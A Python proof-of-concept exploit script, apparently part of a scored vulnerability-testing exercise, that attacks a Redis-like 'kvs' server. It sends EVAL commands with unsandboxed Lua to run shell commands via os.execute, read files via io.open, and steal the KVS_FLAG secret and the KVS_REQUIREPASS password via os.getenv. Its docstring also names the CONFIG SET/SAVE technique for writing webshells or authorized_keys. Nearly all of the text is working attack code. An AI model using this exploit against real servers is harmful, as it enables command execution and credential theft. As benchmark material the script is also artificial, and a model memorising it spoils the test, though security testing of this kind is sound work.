#!/usr/bin/env python3
"""
PoC #2: EVAL runs unsandboxed Lua -> secret disclosure (KVS_FLAG)
----------------------------------------------------------------
Location: cmdEval() in eval.go. The Lua state is created with lua.NewState(),
which opens ALL standard libraries (including os and io) with no sandbox, so a
script can call os.getenv() to read the process environment, os.execute() for
command execution, and io.open() for arbitrary file access. Real Redis strips
exactly these away.

The scoreable impact (per the repo's scoring contract in ../../README.md) is
secret disclosure: this PoC uses os.getenv() from inside EVAL to read the
server process's own KVS_FLAG — the real per-deployment secret
generate-secrets.sh mints for this module (see ../../generate-secrets.sh) and
main() carries in the environment — straight out of its process environment
and back over the wire. An unsandboxed Lua state can read any environment
variable the kvs process has, so it discloses the deployment's minted secret
regardless of whether this particular connection was authenticated. THAT is
the pass/fail condition below. (It also grabs KVS_REQUIREPASS the same way as
bonus evidence — non-empty only on the password-protected kvs-auth instance.)

The underlying RCE + arbitrary-file-read primitive is demonstrated as
supporting evidence (os.execute() writes a unique token to a file, io.open()
reads it back), but reading a non-secret file is not itself scoreable — only
recovering the minted KVS_FLAG is. An unsandboxed EVAL also gives a
client `CONFIG SET dir`/`dbfilename` + `SAVE` an arbitrary-file-write
primitive (see Config.set()/cmdSave() in config.go) — the classic "Redis
writes a webshell / authorized_keys" technique — folded in here as a
documented extra capability rather than a separate numbered PoC.

Run: python3 02_eval_lua_rce.py [host] [port]
      Both `kvs` and `kvs-auth` carry KVS_FLAG, so this scores against either.
"""
import os
import socket
import sys
import uuid

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 6379
# If a harness has configured real auth (fixing vuln #1), authenticate with
# it so this PoC keeps testing #2 (EVAL sandboxing) in isolation instead of
# false-negativing on an unrelated NOAUTH once #1 is patched.
REQUIREPASS = os.environ.get("KVS_REQUIREPASS", "")
# What KVS_FLAG should be, if a harness told us — used to assert the exact
# value recovered. The disclosure doesn't depend on knowing it.
EXPECTED_FLAG = os.environ.get("KVS_FLAG", "")


def encode(*parts):
    out = b"*%d\r\n" % len(parts)
    for p in parts:
        p = p.encode() if isinstance(p, str) else p
        out += b"$%d\r\n%s\r\n" % (len(p), p)
    return out


def read_reply(sock):
    buf = b""
    while not buf.endswith(b"\r\n"):
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf += chunk
    return buf


def cmd(sock, *parts):
    sock.sendall(encode(*parts))
    return read_reply(sock)


def parse_bulk(reply):
    """Extract the payload of a RESP bulk string reply ($<len>\\r\\n<data>\\r\\n).

    Returns b"" for an empty bulk ($0), None for a nil bulk ($-1) or any
    non-bulk reply (e.g. a -ERR error), so callers can tell "server returned
    an empty value" apart from "server didn't return a value at all".
    """
    if not reply or reply[:1] != b"$":
        return None
    try:
        header, rest = reply.split(b"\r\n", 1)
        n = int(header[1:])
    except ValueError:
        return None
    if n < 0:
        return None
    return rest[:n]


def main():
    token = uuid.uuid4().hex
    proof_path = f"/tmp/kvs_eval_{token}"
    s = socket.create_connection((HOST, PORT), timeout=15)
    # Whether the *target* actually has a matching KVS_REQUIREPASS is decided
    # by the AUTH reply, not just by whether this PoC's own env has the var
    # set -- the same script needs to behave against both the no-auth default
    # `kvs` and the password-protected `kvs-auth` without the caller having to
    # know which is which.
    auth_ok = False
    if REQUIREPASS:
        auth_reply = cmd(s, "AUTH", REQUIREPASS)
        auth_ok = auth_reply.startswith(b"+OK")

    # --- Supporting evidence: the unsandboxed os/io primitive (RCE + file read).
    # Not itself scoreable (a non-secret file is not a minted secret), but it
    # proves the same broken sandbox that the secret-disclosure leg relies on.
    # 1) Command execution via os.execute — write the token to a file.
    write_script = f"os.execute(\"echo {token} > {proof_path}\") return 'ran'"
    r1 = cmd(s, "EVAL", write_script, "0")
    print(f"[*] EVAL os.execute(...)   -> {r1!r}")

    # 2) Arbitrary file read via io.open — read it back through the service.
    read_script = (
        f"local f = io.open('{proof_path}', 'r'); "
        "if not f then return 'NOFILE' end; "
        "local d = f:read('*a'); f:close(); return d"
    )
    r2 = cmd(s, "EVAL", read_script, "0")
    print(f"[*] EVAL io.open(...):read  -> {r2!r}")

    # --- The scoreable leg: steal the module's per-deployment secret.
    # The same unsandboxed `os` library that gives os.execute() also gives
    # os.getenv(), so EVAL can read the server's real KVS_FLAG straight out of
    # the process environment and hand it back over the wire.
    getenv_script = "return os.getenv('KVS_FLAG') or ''"
    r4 = cmd(s, "EVAL", getenv_script, "0")
    stolen = parse_bulk(r4)
    print(f"[*] EVAL os.getenv('KVS_FLAG')        -> {r4!r}  (value: {stolen!r})")

    # Bonus: the same primitive leaks the auth credential too (non-empty only
    # where a KVS_REQUIREPASS is configured, i.e. the kvs-auth instance).
    r5 = cmd(s, "EVAL", "return os.getenv('KVS_REQUIREPASS') or ''", "0")
    stolen_pass = parse_bulk(r5)
    print(f"[*] EVAL os.getenv('KVS_REQUIREPASS') -> {r5!r}  (value: {stolen_pass!r})")

    s.close()

    if token.encode() not in r2:
        print("[-] Lua os/io appear to be sandboxed; EVAL did not yield the primitive")
        return 1
    print("[+] Unsandboxed EVAL confirmed: os.execute() ran a shell command and")
    print("    io.open() read the result back (RCE + arbitrary file access).")

    # Score condition: did EVAL disclose a real, minted KVS_FLAG?
    if not stolen:
        print("[-] os.getenv('KVS_FLAG') came back empty — no minted secret in this")
        print("    target's environment to steal. NOT scored against this target.")
        return 1

    # If the harness told us what it should be, assert it.
    if EXPECTED_FLAG and stolen != EXPECTED_FLAG.encode():
        print(f"[-] os.getenv() returned {stolen!r} but the expected KVS_FLAG is")
        print(f"    {EXPECTED_FLAG!r} — value mismatch, not a clean disclosure.")
        return 1

    print("[+] SCORED: EVAL os.getenv() disclosed the deployment's real")
    print(f"    KVS_FLAG secret ({stolen.decode(errors='replace')!r}) —")
    print("    an unsandboxed Lua state leaks the whole process environment, not")
    print("    just files, so it steals the module's minted per-deployment secret.")
    if stolen_pass:
        print(f"[+] ...and the AUTH credential KVS_REQUIREPASS too ({stolen_pass.decode(errors='replace')!r}).")
    if REQUIREPASS and not auth_ok:
        print("[*] (Recovered without a successful AUTH first — the secret was read")
        print("     out of the environment, not brute-forced through the AUTH gate.)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
